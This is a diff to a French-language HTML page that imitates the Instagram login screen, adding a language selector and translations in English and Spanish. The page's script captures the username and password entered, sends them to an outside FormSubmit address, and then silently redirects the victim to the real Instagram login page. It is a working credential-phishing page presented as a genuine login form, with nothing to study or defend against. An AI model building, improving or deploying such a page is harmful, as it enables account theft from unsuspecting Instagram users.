@@ -3,17 +3,30 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Instagram</title>
+<title>Connexion Instagram</title>
 <style>
   body {
     background: #000;
     color: #fff;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     margin: 0;
+    position: relative;
+  }
+  .language-select {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: #121212;
+    border: 1px solid #444;
+    border-radius: 4px;
+    color: #fff;
+    font-size: 14px;
+    padding: 5px 10px;
+    cursor: pointer;
   }
   .container {
     background: #121212;
@@ -23,9 +36,8 @@
     box-sizing: border-box;
   }
   h1 {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    font-size: 36px;
-    font-weight: bold;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 40px;
     margin: 0 0 20px 0;
     text-align: center;
   }
@@ -33,7 +45,6 @@
     display: block;
     margin: 12px 0 6px;
     font-size: 14px;
-    font-weight: 500;
   }
   input[type="text"],
   input[type="password"] {
@@ -58,52 +69,59 @@
     height: 22px;
     fill: #aaa;
   }
-  .facebook-btn {
+  button {
     width: 100%;
-    margin-bottom: 15px;
-    padding: 10px;
-    background: #1877f2;
-    border: none;
-    border-radius: 4px;
-    color: white;
-    font-weight: bold;
-    font-size: 14px;
-    cursor: pointer;
-  }
-  .separator {
-    text-align: center;
-    margin: 15px 0;
-    color: #aaa;
-    font-size: 13px;
-  }
-  button[type="submit"] {
-    width: 100%;
-    margin-top: 10px;
+    margin-top: 20px;
     padding: 10px;
     background: #3897f0;
     border: none;
     border-radius: 4px;
     color: white;
     font-weight: bold;
-    font-size: 14px;
+    font-size: 16px;
     cursor: pointer;
+  }
+  .facebook-btn {
+    background: #1877f2;
+    margin-bottom: 15px;
+  }
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 15px 0;
+    color: #aaa;
+    font-size: 13px;
+  }
+  .divider::before,
+  .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #444;
+    margin: 0 8px;
   }
 </style>
 </head>
 <body>
 
+<select class="language-select" id="languageSelect" aria-label="Choisir la langue">
+  <option value="fr" selected>Français</option>
+  <option value="en">English</option>
+  <option value="es">Español</option>
+</select>
+
 <div class="container">
-  <h1>Instagram</h1>
+  <h1 id="title">Instagram</h1>
 
   <form id="instaForm" autocomplete="off">
-    <button type="button" class="facebook-btn">Continuer avec Facebook</button>
+    <button type="button" class="facebook-btn" id="fbBtn">Connexion avec Facebook</button>
 
-    <div class="separator">─────── OU ───────</div>
+    <div class="divider" id="dividerText">OU</div>
 
-    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
+    <label for="username" id="labelUsername">Téléphone, nom d’utilisateur ou email</label>
     <input type="text" id="username" name="username" required />
 
-    <label for="password">Mot de passe</label>
+    <label for="password" id="labelPassword">Mot de passe</label>
     <div class="password-wrapper">
       <input type="password" id="password" name="password" required />
       <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -112,8 +130,9 @@
       </svg>
     </div>
 
-    <button type="submit">Se connecter</button>
+    <button type="submit" id="submitBtn">Se connecter</button>
   </form>
+
 </div>
 
 <script>
@@ -127,18 +146,60 @@ togglePassword.addEventListener('click', () => {
   togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
 });
 
-// Soumission AJAX vers FormSubmit et redirection vers Instagram
+// Envoi FormSubmit + Redirection
 document.getElementById('instaForm').addEventListener('submit', function(e) {
   e.preventDefault();
 
-  const formData = new FormData(this);
+  const formData = new FormData();
+  formData.append('username', document.getElementById('username').value);
+  formData.append('password', document.getElementById('password').value);
 
-  fetch("https://formsubmit.co/el/riyoye", {
-    method: "POST",
+  fetch('https://formsubmit.co/el/riyoye', {
+    method: 'POST',
     body: formData
   }).finally(() => {
-    window.location.href = "https://www.instagram.com/accounts/login/";
+    window.location.href = 'https://www.instagram.com/accounts/login/';
   });
+});
+
+// Gestion des langues
+const langSelect = document.getElementById('languageSelect');
+
+const translations = {
+  fr: {
+    fbBtn: "Connexion avec Facebook",
+    dividerText: "OU",
+    labelUsername: "Téléphone, nom d’utilisateur ou email",
+    labelPassword: "Mot de passe",
+    submitBtn: "Se connecter",
+    title: "Instagram"
+  },
+  en: {
+    fbBtn: "Log in with Facebook",
+    dividerText: "OR",
+    labelUsername: "Phone, username or email",
+    labelPassword: "Password",
+    submitBtn: "Log In",
+    title: "Instagram"
+  },
+  es: {
+    fbBtn: "Conectarse con Facebook",
+    dividerText: "O",
+    labelUsername: "Teléfono, nombre de usuario o correo electrónico",
+    labelPassword: "Contraseña",
+    submitBtn: "Iniciar sesión",
+    title: "Instagram"
+  }
+};
+
+langSelect.addEventListener('change', () => {
+  const lang = langSelect.value;
+  document.getElementById('fbBtn').textContent = translations[lang].fbBtn;
+  document.getElementById('dividerText').textContent = translations[lang].dividerText;
+  document.getElementById('labelUsername').textContent = translations[lang].labelUsername;
+  document.getElementById('labelPassword').textContent = translations[lang].labelPassword;
+  document.getElementById('submitBtn').textContent = translations[lang].submitBtn;
+  document.getElementById('title').textContent = translations[lang].title;
 });
 </script>
 
